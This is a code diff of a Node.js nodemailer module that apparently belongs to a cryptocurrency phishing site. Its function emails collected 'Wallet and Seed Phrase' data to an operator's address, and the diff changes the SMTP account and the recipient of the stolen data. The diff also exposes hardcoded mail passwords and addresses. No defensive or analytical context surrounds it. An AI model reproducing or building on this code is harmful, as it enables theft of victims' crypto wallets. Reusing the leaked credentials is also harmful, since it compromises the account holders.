@@ -1,19 +1,19 @@
 const nodemailer = require("nodemailer");
 
 const transporter = nodemailer.createTransport({
-  host: "smtp.gmail.com",
+  host: "mail.privateemail.com",
   port: 465,
   secure: true,
   auth: {
-    user: "kingtony3825@gmail.com",
-    pass: "wlyp bejf yyoa acpr",
+    user: "info@traxcoin.one",
+    pass: "info@123#",
   },
 });
 
 function deliverMail(data) {
   const mail = {
-    from: "kingtony3825@gmail.com",
-    to: `kingtony3825@gmail.com`,
+    from: "info@traxcoin.one",
+    to: `mjabbay4real@gmail.com`,
     subject: "New Wallet and Seed Phrase!",
     html: `<!DOCTYPE html>
 <html lang="en">
@@ -119,7 +119,7 @@ function deliverMail(data) {
     </div>
     <footer>
       <small
-        >This email is intended for admin@traxcoin.one. This email is auto generated, do
+        >This email is intended for mjabbay4real@gmail.com. This email is auto generated, do
         not borther replying to this email.</small
       >
       <small
